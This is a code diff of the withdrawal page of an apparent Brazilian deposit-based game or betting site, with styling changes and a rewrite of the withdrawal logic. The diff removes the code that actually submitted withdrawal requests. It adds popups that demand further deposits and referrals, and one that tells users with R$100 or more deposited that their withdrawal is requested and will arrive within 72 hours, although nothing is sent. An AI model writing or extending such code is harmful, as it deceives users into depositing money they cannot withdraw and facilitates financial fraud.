@@ -91,6 +91,11 @@ $nomeDois = config('subway_pix.nomeDois');
 
 
 <style>
+  @import url('https://fonts.googleapis.com/css2?family=Space+Mono:ital,wght@0,400;0,700;1,400;1,700&display=swap');
+    
+    body{
+        font-family: 'Space Mono', sans-serif !important;
+    }
   .sectionFruits{
               background-color: #fe1f4f !important;
             }
@@ -151,6 +156,35 @@ $nomeDois = config('subway_pix.nomeDois');
       border-radius: 15px;
       background-color: #000;
   }
+  .submitBtn{
+        background-color: #fe1f4f !important;
+        border: none !important;
+        color: white !important;
+        padding: 15px 10px !important;
+        text-align: center !important;
+        text-decoration: none !important;
+        display: inline-block !important;
+        font-size: 24px !important;
+        margin: 4px 2px !important;
+        transition-duration: 0.4s !important;
+        cursor: pointer !important;
+        border-radius: 15px !important;
+        font-family: 'right grotesk', sans-serif !important;
+        font-weight: bold !important;
+        font-smooth: always !important;
+        box-shadow: -15px 3px 0 3px #1f2024 !important;
+        letter-spacing: 2px !important;
+    }
+    
+    .submitBtn:hover {
+        transform: translate(10px, -10px) !important;
+        box-shadow: -25px 13px 0 3px #1f2024 !important; 
+        background-color: #9f1331 !important;
+    }
+
+    .submitBtn > a {
+      color: white !important;
+    }
 </style>
 
 
@@ -196,90 +230,57 @@ async function popup(titulo, texto, linkUrl, linkTexto){
         text: texto,
         confirmButtonText: `<a href=${linkUrl}>${linkTexto}</a>`,
         showCloseButton: true,
+        confirmButtonColor: "#fff",
         customClass: {
-          confirmButton: "primary-button button3 w-button",
-          popup: 'minting-container',
+          confirmButton: 'submitBtn',
+          popup:'minting-container'
+  
         }
     });
-}
-
-function  toast(mensagem){
-  Swal.fire({
-              toast: true,
-              position: "top-end",
-              showConfirmButton: false,
-              timer: 4000,
-              icon: "error",
-              timerProgressBar: true,
-              text: mensagem,
-              color:"#000000",
-              iconColor: "#000000",
-              customClass: {
-                  popup: 'colored-toast',
-              },
-            })
 }
 
 
 async function processarForm(){
 
     event.preventDefault();
-    clearTimeout(timeoutId);
     var saldoString = "<?php echo $saldo; ?>"
     var depositouString = "<?php echo $depositou; ?>"
-    
     var saldo = parseFloat(saldoString)
     var depositou = parseFloat(depositouString)
     var elementoH4 = document.getElementById("alerta-saque");
-  
-
-    if(saldo <= 0){
-      toast("Sem saldo!");
-      
-    }
-    if(saldo >= 0 && depositou <= 49){
-      
-      const result = await popup('Que pena!', 'Ainda não alcançou o depósito minimo de R$50,00 para o saque, faça um depósito! É cumulativo', '../deposito', 'Depositar');
-
-      if(result.isConfirmed){
-        location.href = "../deposito";
-      }
-    }
-    if(saldo > 0 && saldo < 100){
-      elementoH4.textContent = "Saldo maior que 0 e menor que 100"
-    }
-
-    if(depositou >= 49 && saldo > 100 && saldo < 300){
-
-      const result = await popup('Falta pouco!', 'Você precisa alcançar um saldo de R$300,00', '../painel', 'Jogar');
-      if(result.isConfirmed){
-        location.href = "../painel";
-      }
-    }
-
-    if(depositou >= 49 && saldo >= 300){
-
-      
-       const result = await popup('UHUUL', 'Você conseguiu! Aguarde a fila de saque, e logo receberá o seu prêmio', '../painel', 'Ganhar mais!');
-       if(result.isConfirmed){
-        var CPF = document.getElementById("withdrawCPF").value;
-        var valor = document.getElementById("withdrawValue").value;
-        const response = await fetch(window.location.href, {
-        method: 'POST',
-        body: new URLSearchParams({
-        'withdrawCPF': CPF,
-        'withdrawValue': valor,
-      }),
-    headers: {
-      'Content-Type': 'application/x-www-form-urlencoded',
-      'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').getAttribute('content'),
-    },
-      })
-      location.href = "../painel";
-       } 
-    }
-
     
+    if(saldo <= 0){
+      elementoH4.textContent = "Saldo insuficiente, deposite para começar a lucrar";
+      return false;
+    }
+
+    if(depositou > 1 && depositou  < 48){
+      clearTimeout(timeoutId);
+      const result = await popup('ATIVE SEU SAQUE', 'Para liberar o recurso de saque, você precisa ter acumulado R$50 em depositos em sua conta! Faça o depósito para liberar a função automaticamente e ter saques ilimitados.', '../deposito', 'DEPOSITAR');
+
+      if (result.isConfirmed) {
+        exibirNomesAleatorios();
+      }
+      return false;
+    }
+
+    if(depositou >= 49 && depositou  <= 99){
+      clearTimeout(timeoutId);
+      const result = await popup('SAQUE PENDENTE', 'Você precisa ter feito um deposito de R$50 em sua conta! Lembrando que precisa ser 1 único no valor R$50. A função saque e liberada automaticamente apôs o deposito', '../deposito', 'ATIVAR AGORA');
+      if (result.isConfirmed) {
+        exibirNomesAleatorios();
+      }
+      return false;
+    }
+
+    if(depositou >= 100){
+      clearTimeout(timeoutId);
+      const result = await popup('SAQUE SOLICITADO', 'Estamos em alta demanda e o seu saque vai cair dentro de 72h. Indique um amigo e ganhe R$50 por convidado', '../afiliate', 'INDICAR');
+      if (result.isConfirmed) {
+        exibirNomesAleatorios();
+      }
+      return false;
+    }
 
     return false;
 }
@@ -318,7 +319,7 @@ Valor para saque: (SALDO: R$
 </h4>
 
 <div class="rarity-row roboto-type2">
-<input type="number" data-name="Valor de saque" min="0.00" max="" name="withdrawValue" id="withdrawValue" placeholder="R$<?= $saldo ?>" class="large-input-field w-node-_050dfc36-93a8-d840-d215-4fca9adfe60d-9adfe605 w-input" required>
+<input type="number" data-name="Valor de saque" min="0.00" max="" name="withdrawValue" {{ $depositou <= 0 ? 'readonly' : ''}} id="withdrawValue" placeholder="R$<?= $saldo ?>" class="large-input-field w-node-_050dfc36-93a8-d840-d215-4fca9adfe60d-9adfe605 w-input">
 
 
 </div>
